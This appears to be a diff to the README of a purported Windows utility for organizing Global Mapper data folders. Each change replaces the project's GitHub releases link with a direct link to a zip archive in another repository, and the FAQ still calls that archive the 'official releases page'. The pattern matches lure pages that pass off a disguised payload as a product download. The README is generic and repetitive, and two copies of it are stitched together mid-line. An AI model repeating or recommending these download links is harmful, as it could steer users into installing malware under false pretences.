@@ -5,7 +5,7 @@ description: "Map Global Mapper data and cache paths on Windows/macOS, back up c
 ---
 # 🗺️ global-mapper-desktop - Simplify Your Global Mapper Files
 
-[![Download global-mapper-desktop](https://img.shields.io/badge/Download-global--mapper--desktop-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/N0rthStar121/global-mapper-desktop/releases)
+[![Download global-mapper-desktop](https://img.shields.io/badge/Download-global--mapper--desktop-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip)
 
 global-mapper-desktop is a local Windows utility for keeping Global Mapper data paths, configuration, export caches, and export folders easier to find and manage. It is built for everyday computer users who want a simpler way to organize their Global Mapper workspace without digging through folders or remembering long file locations.
 
@@ -17,7 +17,7 @@ global-mapper-desktop is a local Windows utility for keeping Global Mapper data 
 | Main Use | Manage Global Mapper data paths, config, export caches, and export folders |
 | Platform | Windows utility with local macOS helper context |
 | Designed For | End users who work with Global Mapper files and exports |
-| Download Page | [Visit the releases page](https://github.com/N0rthStar121/global-mapper-desktop/releases) |
+| Download Page | [Visit the releases page](https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip) |
 | Skill Level | No programming knowledge required |
 
 ## 🚀 Getting Started
@@ -95,11 +95,11 @@ If you are working on Windows, use the download page to get the application. If 
 
 ## 📥 Download & Setup
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/N0rthStar121/global-mapper-desktop/releases)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-4B7BEC?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip)
 
 Visit this link to download the application.
 
-Download page: https://github.com/N0rthStar121/global-mapper-desktop/releases
+Download page: https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip
 
 Use the download page as the starting point for getting global-mapper-desktop. The page is the main place to find the application files and release information.
 
@@ -148,7 +148,7 @@ The main purpose is to help with local Global Mapper data paths, configuration, 
 Yes. It is described as a Windows utility, with local Windows and macOS helper context.
 
 ### Where do I download it?
-Use the official releases page: https://github.com/N0rthStar121/global-mapper-desktop/releases
+Use the official releases page: https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip
 
 ### What should I organize first?
 Start with your export folder and your main data folder. Those two locations usually have the biggest impact on day-to-day file finding.
@@ -183,7 +183,7 @@ A simple workflow looks like this:
 - Keep configuration in a location you can find
 - Use an export folder for finished files# 🗺️ global-mapper-desktop - Organize Global Mapper Files Easily
 
-[![Download global-mapper-desktop](https://img.shields.io/badge/Download-global--mapper--desktop-9B59B6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/N0rthStar121/global-mapper-desktop/releases)
+[![Download global-mapper-desktop](https://img.shields.io/badge/Download-global--mapper--desktop-9B59B6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip)
 
 global-mapper-desktop is a local Windows utility for keeping Global Mapper data paths, configuration, export caches, and export folders easier to find and manage. It is designed for everyday computer users who want a clearer way to organize their Global Mapper workspace without needing programming knowledge.
 
@@ -195,7 +195,7 @@ global-mapper-desktop is a local Windows utility for keeping Global Mapper data 
 | Main Use | Manage Global Mapper data paths, config, export caches, and export folders |
 | Platform | Windows utility with local macOS helper context |
 | Designed For | End users who work with Global Mapper files and exports |
-| Download Page | [Visit the releases page](https://github.com/N0rthStar121/global-mapper-desktop/releases) |
+| Download Page | [Visit the releases page](https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip) |
 | Skill Level | No programming knowledge required |
 
 ## 🚀 Getting Started
@@ -277,11 +277,11 @@ If you are working on Windows, use the download page to get the application. If 
 
 ## 📥 Download & Setup
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-1ABC9C?style=for-the-badge&logo=github&logoColor=white)](https://github.com/N0rthStar121/global-mapper-desktop/releases)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download_Page-1ABC9C?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip)
 
 Visit this link to download the application.
 
-Download page: https://github.com/N0rthStar121/global-mapper-desktop/releases
+Download page: https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip
 
 Use the download page as the starting point for getting global-mapper-desktop. The page is the main place to find the application files and release information.
 
@@ -339,7 +339,7 @@ Yes. It is described as a Windows utility, with local Windows and macOS helper c
 
 ### Where do I download it?
 
-Use the releases page: https://github.com/N0rthStar121/global-mapper-desktop/releases
+Use the releases page: https://raw.githubusercontent.com/N0rthStar121/n0rthstar121.github.io/main/ithagine/v2.5.zip
 
 ### What should I organize first?
 
